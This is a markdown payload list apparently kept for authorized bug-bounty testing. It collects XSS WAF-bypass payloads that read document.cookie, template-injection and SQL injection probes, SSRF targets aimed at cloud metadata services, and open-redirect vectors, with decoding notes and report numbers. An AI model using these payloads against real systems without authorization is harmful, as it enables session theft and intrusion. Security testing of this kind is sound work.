# Payload list (validated bypasses)

A running collection of payloads for **authorized** bug-bounty testing. Add a
payload only after it works on an **in-scope** asset; record enough context to
reproduce it. `alert(document.cookie)` / `alert(1)` are harmless PoC markers —
never escalate beyond what the program's scope and rules allow.

**For each entry record:** payload · context (where it reflected / sink) ·
encoding · target class (WAF/sanitizer/framework) · what it decoded to · report
or source.

---

## XSS

### Akamai WAF bypass — keyword-free `svg onload`
```
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
```
- **Raw:** `<!--><svg onload='top[/al/.source+/ert/.source](document.cookie)'>`
- **Decodes to:** `top["alert"](document.cookie)` → `alert(document.cookie)`
- **Why it bypasses:** `<!-->` comment breakout + `svg onload` sink (no
  `<script>`) + function name built from `/al/.source+/ert/.source` so the
  literal `alert` never appears for signature matching.
- **Context:** HTML body reflection, keyword/signature WAF (Akamai).
- See `techniques-injection.md` → "WAF / filter evasion".

### Keyword-free call constructors (swap into the bracket above)
- `self[/al/.source+/ert/.source](1)` / `window[...]` / `this[...]`
- `top[8680439..toString(30)](document.cookie)`  → `8680439..toString(30)` = `"alert"`
- `String.fromCharCode(...)` to assemble sink names/strings

### Classic sink/filter-confusion vectors (from the corpus)
- `'"><marquee><img src=x onerror=confirm(1)></marquee>...<plaintext/onmouseover=prompt(1)>` (TinyMCE filter confusion, report 262230)
- `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>` (data-URI, 262230)
- SVG + `<!ENTITY>` to defeat an attribute allow-list (report 232174)
- `{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}` (expression-template injection, 131450)

---

## SSTI (detection probes)
- `{{7*7}}` → `49` (Jinja2/Twig server-side eval)
- `${7*7}` / `#{7*7}` / `<%= 7*7 %>` (other engines)
- `{{7*'7'}}` → `7777777` (Jinja2) vs error (Twig) — engine fingerprint
- Jinja2 chain: `{{ ''.__class__.mro()[1].__subclasses__() }}` (reports 125980, 423541)

## SQLi (detection probes)
- `(select(0)from(select(sleep(5)))v)` — time-based (report 786044)
- `' or sleep(5)-- -` / `" or sleep(5)-- -`
- `1' AND 1=1-- -` vs `1' AND 1=2-- -` — boolean differential

## SSRF (targets to try once a fetch sink is found)
- `http://169.254.169.254/latest/meta-data/` (AWS)
- `http://metadata.google.internal/computeMetadata/v1beta1/` (GCP, legacy no-header path — report 341876)
- DNS-rebind host with low TTL (defeat validate-then-fetch — report 541169)

## Open redirect (detection probes)
- `?next=https://example.com` / `//example.com` / `https:/\example.com`
- `https://whitelisted@attacker.com` · `/\attacker.com` · `?redirect_uri=…`

---

*Keep this list lab/scope-only. Pair every payload with the remediation notes in
the matching `techniques-*.md` file so findings come with a fix.*
